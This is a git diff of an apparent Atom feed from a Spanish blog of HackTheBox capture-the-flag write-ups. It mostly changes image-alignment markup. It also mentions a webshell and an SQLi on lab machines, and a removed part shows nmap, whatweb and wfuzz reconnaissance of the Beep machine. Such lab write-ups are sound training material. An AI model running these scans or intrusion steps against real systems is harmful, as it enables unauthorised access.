+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/support/07-finish.png&quot; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Support" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina support AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB forest AD</title><link href="http://localhost:4000/forest/" rel="alternate" type="text/html" title="HTB forest AD" /><published>2023-03-01T00:00:00-05:00</published><updated>2023-03-01T00:00:00-05:00</updated><id>http://localhost:4000/forest</id><content type="html" xml:base="http://localhost:4000/forest/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Support" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina support AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB forest AD</title><link href="http://localhost:4000/forest/" rel="alternate" type="text/html" title="HTB forest AD" /><published>2023-03-01T00:00:00-05:00</published><updated>2023-03-01T00:00:00-05:00</updated><id>http://localhost:4000/forest</id><content type="html" xml:base="http://localhost:4000/forest/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/forest/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -1283,7 +1515,7 @@ Privileged IT Accounts
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/forest/03-blood.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -1399,13 +1631,13 @@ WINRM       10.10.10.161    5985   FOREST           &lt;span class=&quot;o&quot;
 
 &lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forest&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/forest/04-finish.png&quot; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Forest" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina forest AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB sauna AD</title><link href="http://localhost:4000/sauna/" rel="alternate" type="text/html" title="HTB sauna AD" /><published>2023-02-15T00:00:00-05:00</published><updated>2023-02-15T00:00:00-05:00</updated><id>http://localhost:4000/sauna</id><content type="html" xml:base="http://localhost:4000/sauna/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Forest" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina forest AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB sauna AD</title><link href="http://localhost:4000/sauna/" rel="alternate" type="text/html" title="HTB sauna AD" /><published>2023-02-15T00:00:00-05:00</published><updated>2023-02-15T00:00:00-05:00</updated><id>http://localhost:4000/sauna</id><content type="html" xml:base="http://localhost:4000/sauna/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/sauna/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -1905,7 +2137,7 @@ Es importante aclarar que si existen novedades con la instalación se recurra al
 
 &lt;/blockquote&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/sauna/03-blood.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -1981,13 +2213,13 @@ c:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;echo.%root:~0,10%
 
 &lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sauna&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/sauna/04-finish.png&quot; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Sauna" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina sauna AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB timelapse AD</title><link href="http://localhost:4000/timelapse/" rel="alternate" type="text/html" title="HTB timelapse AD" /><published>2023-02-01T00:00:00-05:00</published><updated>2023-02-01T00:00:00-05:00</updated><id>http://localhost:4000/timelapse</id><content type="html" xml:base="http://localhost:4000/timelapse/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Sauna" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina sauna AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB timelapse AD</title><link href="http://localhost:4000/timelapse/" rel="alternate" type="text/html" title="HTB timelapse AD" /><published>2023-02-01T00:00:00-05:00</published><updated>2023-02-01T00:00:00-05:00</updated><id>http://localhost:4000/timelapse</id><content type="html" xml:base="http://localhost:4000/timelapse/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/timelapse/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -2422,13 +2654,13 @@ SMB         10.10.11.152    445    DC01             &lt;span class=&quot;o&quot;
 
 &lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timelapse&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/timelapse/03-finish.png&quot; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Timelapse" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina timelapse AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB active AD</title><link href="http://localhost:4000/active/" rel="alternate" type="text/html" title="HTB active AD" /><published>2023-01-18T00:00:00-05:00</published><updated>2023-01-18T00:00:00-05:00</updated><id>http://localhost:4000/active</id><content type="html" xml:base="http://localhost:4000/active/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Timelapse" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina timelapse AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB active AD</title><link href="http://localhost:4000/active/" rel="alternate" type="text/html" title="HTB active AD" /><published>2023-01-18T00:00:00-05:00</published><updated>2023-01-18T00:00:00-05:00</updated><id>http://localhost:4000/active</id><content type="html" xml:base="http://localhost:4000/active/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/active/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -2832,13 +3064,13 @@ aa4beed1c0
 
 &lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;active&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/active/03-finish.png&quot; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Active" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina active AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB granny</title><link href="http://localhost:4000/granny/" rel="alternate" type="text/html" title="HTB granny" /><published>2023-01-04T00:00:00-05:00</published><updated>2023-01-04T00:00:00-05:00</updated><id>http://localhost:4000/granny</id><content type="html" xml:base="http://localhost:4000/granny/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Active" /><category term="Active Directory" /><summary type="html">Vamos a resolver la máquina active AD de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB granny</title><link href="http://localhost:4000/granny/" rel="alternate" type="text/html" title="HTB granny" /><published>2023-01-04T00:00:00-05:00</published><updated>2023-01-04T00:00:00-05:00</updated><id>http://localhost:4000/granny</id><content type="html" xml:base="http://localhost:4000/granny/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/granny/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -2982,7 +3214,7 @@ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&qu
 
 &lt;p&gt;Cargamos en el navegador el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.15/webshell.txt&lt;/code&gt;&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/granny/03-page.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -3068,13 +3300,13 @@ aa4beed1c0
 
 &lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;granny&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/granny/04-finish.png&quot; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Granny" /><summary type="html">Vamos a resolver la máquina granny de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB cronos</title><link href="http://localhost:4000/cronos/" rel="alternate" type="text/html" title="HTB cronos" /><published>2022-12-21T00:00:00-05:00</published><updated>2022-12-21T00:00:00-05:00</updated><id>http://localhost:4000/cronos</id><content type="html" xml:base="http://localhost:4000/cronos/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Granny" /><summary type="html">Vamos a resolver la máquina granny de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB cronos</title><link href="http://localhost:4000/cronos/" rel="alternate" type="text/html" title="HTB cronos" /><published>2022-12-21T00:00:00-05:00</published><updated>2022-12-21T00:00:00-05:00</updated><id>http://localhost:4000/cronos</id><content type="html" xml:base="http://localhost:4000/cronos/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/cronos/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -3193,7 +3425,7 @@ cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 
 
 &lt;p&gt;Ahora que tenemos dominios y subdominios, procedemos a investigar un poco y encontramos un portal de acceso en el subdominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.cronos.htb&lt;/code&gt; al cual intentamos realizar un ataque &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQLi&lt;/code&gt; exitoso.&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/cronos/03-page.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -3276,13 +3508,13 @@ bash-4.3# find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; root.txt 2&
 
 &lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cronos&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/cronos/04-finish.png&quot; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;.&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Cronos" /><summary type="html">Vamos a resolver la máquina cronos de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB bastard</title><link href="http://localhost:4000/bastard/" rel="alternate" type="text/html" title="HTB bastard" /><published>2022-12-07T00:00:00-05:00</published><updated>2022-12-07T00:00:00-05:00</updated><id>http://localhost:4000/bastard</id><content type="html" xml:base="http://localhost:4000/bastard/">&lt;p align=&quot;center&quot;&gt;
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;.&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Cronos" /><summary type="html">Vamos a resolver la máquina cronos de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB bastard</title><link href="http://localhost:4000/bastard/" rel="alternate" type="text/html" title="HTB bastard" /><published>2022-12-07T00:00:00-05:00</published><updated>2022-12-07T00:00:00-05:00</updated><id>http://localhost:4000/bastard</id><content type="html" xml:base="http://localhost:4000/bastard/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/bastard/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -3831,403 +4063,10 @@ echo.%root:~0,10%
 
 &lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bastard&lt;/code&gt; de HackTheBox!&lt;/p&gt;
 
-&lt;p align=&quot;center&quot;&gt;
+&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/bastard/03-finish.png&quot; /&gt;
 &lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Bastard" /><summary type="html">Vamos a resolver la máquina Bastard de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB Beep</title><link href="http://localhost:4000/beep/" rel="alternate" type="text/html" title="HTB Beep" /><published>2022-11-23T00:00:00-05:00</published><updated>2022-11-23T00:00:00-05:00</updated><id>http://localhost:4000/beep</id><content type="html" xml:base="http://localhost:4000/beep/">&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/beep/02-tarjeta.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;¡Hola!
-En esta ocasión vamos a resolver de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;beep&lt;/code&gt; de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
-La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
-
-&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
-
-&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;beep&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack beep
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
-
-&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad &lt;a href=&quot;https://bast1ant1c.github.io/osping/&quot;&gt;osping&lt;/a&gt; detectando el tipo de sistema operativo basado en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttl&lt;/code&gt; &lt;em&gt;time to live&lt;/em&gt; de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;osping 10.10.10.7
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Detectando sistema operativo ...
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.7 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Linux
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Linux&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
-  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.7 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-22/tcp    open  ssh
-25/tcp    open  smtp
-80/tcp    open  http
-110/tcp   open  pop3
-111/tcp   open  rpcbind
-143/tcp   open  imap
-443/tcp   open  https
-880/tcp   open  unknown
-993/tcp   open  imaps
-995/tcp   open  pop3s
-3306/tcp  open  mysql
-4190/tcp  open  sieve
-4445/tcp  open  upnotifyp
-4559/tcp  open  hylafax
-5038/tcp  open  unknown
-10000/tcp open  snet-sensor-mgmt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,25,80,110,111,143,443,880,993,995,3306,4190,4445,4559,5038,10000 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.7 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; versions
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-PORT      STATE SERVICE    VERSION
-22/tcp    open  ssh        OpenSSH 4.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-25/tcp    open  smtp?
-|_smtp-commands: Couldn&lt;span class=&quot;s1&quot;&gt;'t establish connection on port 25
-80/tcp    open  http       Apache httpd 2.2.3
-|_http-server-header: Apache/2.2.3 (CentOS)
-|_http-title: Did not follow redirect to https://10.10.10.7/
-110/tcp   open  pop3?
-111/tcp   open  rpcbind    2 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2            111/tcp   rpcbind
-|   100000  2            111/udp   rpcbind
-|   100024  1            877/udp   status
-|_  100024  1            880/tcp   status
-143/tcp   open  imap?
-443/tcp   open  ssl/https?
-| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
-| Not valid before: 2017-04-07T08:22:08
-|_Not valid after:  2018-04-07T08:22:08
-|_ssl-date: 2022-08-12T04:36:17+00:00; +4h48m04s from scanner time.
-880/tcp   open  status     1 (RPC #100024)
-993/tcp   open  imaps?
-995/tcp   open  pop3s?
-3306/tcp  open  mysql      MySQL (unauthorized)
-|_sslv2: ERROR: Script execution failed (use -d to debug)
-|_ssl-cert: ERROR: Script execution failed (use -d to debug)
-|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
-|_ssl-date: ERROR: Script execution failed (use -d to debug)
-|_tls-alpn: ERROR: Script execution failed (use -d to debug)
-4190/tcp  open  sieve?
-4445/tcp  open  upnotifyp?
-4559/tcp  open  hylafax?
-5038/tcp  open  asterisk   Asterisk Call Manager 1.1
-10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
-|_http-server-header: MiniServ/1.570
-|_http-title: Site doesn'&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Service Info: Host: 127.0.0.1
-
-Host script results:
-|_clock-skew: 4h48m03s
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento-web&quot;&gt;RECONOCIMIENTO WEB&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con el reconocimiento del puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; para identificar software que sea potencialmente vulnerable o de utilidad para nosotros.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb 10.10.10.7
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-http://10.10.10.7 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302 Found] Apache[2.2.3], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.2.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.7], RedirectLocation[https://10.10.10.7/], Title[302 Found]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Inspeccionando las peticiones podemos ver un panel de login con el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;elastix&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/beep/03-page.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Vamos a realizar fuzzing por medio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt;, esta vez para encontrar rutas con posible contenido que pueda ser útil.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt httpS://10.10.10.7/FUZZ
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Resultados&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
-ID           Response   Lines    Word       Chars       Payload                                 
-&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
-000000047:   301        9 L      28 W       308 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;                     
-000000131:   301        9 L      28 W       311 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;modules&quot;&lt;/span&gt;    
-000000002:   301        9 L      28 W       310 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;images&quot;&lt;/span&gt;                   
-000000187:   301        9 L      28 W       308 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;mail&quot;&lt;/span&gt;                    
-000000113:   301        9 L      28 W       310 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;themes&quot;&lt;/span&gt;
